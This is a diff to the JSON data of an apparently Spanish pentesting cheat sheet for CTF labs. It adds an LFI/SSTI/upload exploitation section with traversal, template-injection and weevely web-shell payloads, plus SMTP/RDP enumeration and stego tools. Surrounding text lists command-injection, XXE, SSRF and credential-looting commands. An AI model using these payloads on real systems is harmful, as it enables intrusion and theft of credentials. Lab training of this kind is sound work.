@@ -2,7 +2,7 @@
   "generatedAt": "2026-07-08",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 397,
+    "totalCommands": 426,
     "totalTags": 9
   },
   "tags": [
@@ -649,7 +649,12 @@
         "mysql -h $IP -u root -p",
         "impacket-mssqlclient $USER:$PASS@$IP -windows-auth",
         "psql -h $IP -U postgres",
-        "redis-cli -h $IP"
+        "redis-cli -h $IP",
+        "nc -nv $IP 25",
+        "smtp-user-enum -M VRFY -U users.txt -t $IP",
+        "swaks --to test@$DOMAIN --server $IP",
+        "xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution",
+        "nmap --script rdp-enum-encryption -p 3389 $IP"
       ],
       "tables": [
         [
@@ -826,6 +831,20 @@
         ],
         [
           "h2",
+          "SMTP (25) / RDP (3389)"
+        ],
+        [
+          "code",
+          [
+            "nc -nv $IP 25",
+            "smtp-user-enum -M VRFY -U users.txt -t $IP",
+            "swaks --to test@$DOMAIN --server $IP",
+            "xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution",
+            "nmap --script rdp-enum-encryption -p 3389 $IP"
+          ]
+        ],
+        [
+          "h2",
           "Servicios tipicos"
         ],
         [
@@ -866,7 +885,7 @@
           ]
         ]
       ],
-      "searchText": "Recon y servicios Encontrar superficie, nombres, versiones y rutas de entrada. Escaneo inicial nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt Usa -Pn si la maquina filtra ping. Primero descubre puertos; despues enumera versiones y scripts. UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS. HTTP / Web (80, 443, 8080) whatweb $URL curl -sSI $URL curl -sS $URL/robots.txt nikto -h $URL gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40 ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -H 'Host: FUZZ.$DOMAIN' -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ SMB (139, 445) nxc smb $IP nxc smb $IP -u '' -p '' --shares nxc smb $IP -u 'guest' -p '' --shares smbclient -L //$IP -N smbclient //$IP/share -N smbmap -H $IP enum4linux-ng -A $IP nxc smb $IP -u 'guest' -p '' --rid-brute RPC / NetBIOS (135, 137) rpcclient -U '' -N $IP rpcclient -U '' -N $IP -c 'enumdomusers' rpcclient -U '' -N $IP -c 'querydominfo' nmblookup -A $IP FTP (21) ftp $IP nmap --script ftp-anon -p 21 $IP wget -m --no-passive ftp://anonymous:anonymous@$IP DNS (53) dig @$IP $DOMAIN dig axfr @$IP $DOMAIN dnsrecon -d $DOMAIN -n $IP nslookup -type=any $DOMAIN $IP SNMP (161/udp) snmpwalk -v2c -c public $IP snmpbulkwalk -v2c -c public $IP onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP NFS (2049) showmount -e $IP mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock LDAP (389, 636) ldapsearch -x -H ldap://$IP -s base namingContexts ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' nxc ldap $IP -u '' -p '' Bases de datos (3306, 1433, 5432, 6379) mysql -h $IP -u root -p impacket-mssqlclient $USER:$PASS@$IP -windows-auth psql -h $IP -U postgres redis-cli -h $IP Servicios tipicos Servicio Comandos utiles SMB smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares FTP ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/ DNS dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP SNMP snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP NFS showmount -e $IP; mount -t nfs $IP:/share /mnt/share SSH probar claves, usuarios filtrados y passphrases con ssh2john."
+      "searchText": "Recon y servicios Encontrar superficie, nombres, versiones y rutas de entrada. Escaneo inicial nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt Usa -Pn si la maquina filtra ping. Primero descubre puertos; despues enumera versiones y scripts. UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS. HTTP / Web (80, 443, 8080) whatweb $URL curl -sSI $URL curl -sS $URL/robots.txt nikto -h $URL gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40 ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -H 'Host: FUZZ.$DOMAIN' -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ SMB (139, 445) nxc smb $IP nxc smb $IP -u '' -p '' --shares nxc smb $IP -u 'guest' -p '' --shares smbclient -L //$IP -N smbclient //$IP/share -N smbmap -H $IP enum4linux-ng -A $IP nxc smb $IP -u 'guest' -p '' --rid-brute RPC / NetBIOS (135, 137) rpcclient -U '' -N $IP rpcclient -U '' -N $IP -c 'enumdomusers' rpcclient -U '' -N $IP -c 'querydominfo' nmblookup -A $IP FTP (21) ftp $IP nmap --script ftp-anon -p 21 $IP wget -m --no-passive ftp://anonymous:anonymous@$IP DNS (53) dig @$IP $DOMAIN dig axfr @$IP $DOMAIN dnsrecon -d $DOMAIN -n $IP nslookup -type=any $DOMAIN $IP SNMP (161/udp) snmpwalk -v2c -c public $IP snmpbulkwalk -v2c -c public $IP onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP NFS (2049) showmount -e $IP mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock LDAP (389, 636) ldapsearch -x -H ldap://$IP -s base namingContexts ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' nxc ldap $IP -u '' -p '' Bases de datos (3306, 1433, 5432, 6379) mysql -h $IP -u root -p impacket-mssqlclient $USER:$PASS@$IP -windows-auth psql -h $IP -U postgres redis-cli -h $IP SMTP (25) / RDP (3389) nc -nv $IP 25 smtp-user-enum -M VRFY -U users.txt -t $IP swaks --to test@$DOMAIN --server $IP xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution nmap --script rdp-enum-encryption -p 3389 $IP Servicios tipicos Servicio Comandos utiles SMB smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares FTP ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/ DNS dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP SNMP snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP NFS showmount -e $IP; mount -t nfs $IP:/share /mnt/share SSH probar claves, usuarios filtrados y passphrases con ssh2john."
     },
     {
       "id": "section-06",
@@ -907,6 +926,16 @@
         "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
         "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
         "sqlmap -r request.txt --batch --level 3",
+        "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
+        "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
+        "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
+        "curl -sS \"$URL/?name={{7*7}}\"",
+        "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
+        "weevely generate S3cr3t shell.php",
+        "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+        "weevely $URL/uploads/shell.php S3cr3t",
+        "git-dumper $URL/.git/ ./loot_git",
+        "curl -sS \"$URL/.git/HEAD\"",
         "arjun -u \"$URL/api/endpoint\"",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
         "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404",
@@ -1047,6 +1076,25 @@
         ],
         [
           "h2",
+          "Explotacion web (LFI / SSTI / upload)"
+        ],
+        [
+          "code",
+          [
+            "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
+            "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
+            "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
+            "curl -sS \"$URL/?name={{7*7}}\"",
+            "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
+            "weevely generate S3cr3t shell.php",
+            "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+            "weevely $URL/uploads/shell.php S3cr3t",
+            "git-dumper $URL/.git/ ./loot_git",
+            "curl -sS \"$URL/.git/HEAD\""
+          ]
+        ],
+        [
+          "h2",
           "Triage de bugs"
         ],
         [
@@ -1099,7 +1147,7 @@
           ]
         ]
       ],
-      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto. APIs REST y metodos HTTP curl -sS $URL/api/ ; curl -sS $URL/api/v1/ curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs curl -sS -i -X OPTIONS \"$URL/api/resource\" for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}' curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT' curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}' curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}' curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}' curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\" sqlmap -r request.txt --batch --level 3 Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
+      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto. APIs REST y metodos HTTP curl -sS $URL/api/ ; curl -sS $URL/api/v1/ curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs curl -sS -i -X OPTIONS \"$URL/api/resource\" for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}' curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT' curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}' curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}' curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}' curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\" sqlmap -r request.txt --batch --level 3 Explotacion web (LFI / SSTI / upload) curl -sS \"$URL/page.php?file=../../../../etc/passwd\" curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\" curl -sS \"$URL/page.php?file=/proc/self/environ\" curl -sS \"$URL/?name={{7*7}}\" curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" weevely generate S3cr3t shell.php curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\" weevely $URL/uploads/shell.php S3cr3t git-dumper $URL/.git/ ./loot_git curl -sS \"$URL/.git/HEAD\" Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
     },
     {
       "id": "section-07",
@@ -1324,6 +1372,13 @@
         "python3 firefox_decrypt.py /ruta/al/perfil",
         "lazagne.exe all",
         "python3 lazagne.py browsers",
+        "file archivo; strings -n 8 archivo",
+        "exiftool imagen.jpg",
+        "binwalk -e archivo",
+        "steghide info imagen.jpg ; steghide extract -sf imagen.jpg",
+        "stegseek imagen.jpg /usr/share/wordlists/rockyou.txt",
+        "zsteg -a imagen.png",
+        "foremost -i archivo -o salida",
         "find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null",
         "grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null",
         "find /home -name '.ssh' -type d 2>/dev/null",
@@ -1443,6 +1498,22 @@
           ]
         ],
         [
+          "h2",
+          "Stego y forense de ficheros"
+        ],
+        [
+          "code",
+          [
+            "file archivo; strings -n 8 archivo",
+            "exiftool imagen.jpg",
+            "binwalk -e archivo",
+            "steghide info imagen.jpg ; steghide extract -sf imagen.jpg",
+            "stegseek imagen.jpg /usr/share/wordlists/rockyou.txt",
+            "zsteg -a imagen.png",
+            "foremost -i archivo -o salida"
+          ]
+        ],
+        [
           "bullets",
           [
             "Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro.",
@@ -1452,7 +1523,7 @@
           ]
         ]
       ],
-      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Stego y forense de ficheros file archivo; strings -n 8 archivo exiftool imagen.jpg binwalk -e archivo steghide info imagen.jpg ; steghide extract -sf imagen.jpg stegseek imagen.jpg /usr/share/wordlists/rockyou.txt zsteg -a imagen.png foremost -i archivo -o salida Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
     },
     {
       "id": "section-10",
@@ -1586,11 +1657,8 @@
       ],
       "commands": [
         "whoami; id; groups; hostname; pwd",
-        "sudo -l",
         "find / -perm -4000 -type f -ls 2>/dev/null",
-        "getcap -r / 2>/dev/null",
         "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
-        "cat /etc/crontab; ls -la /etc/cron.*",
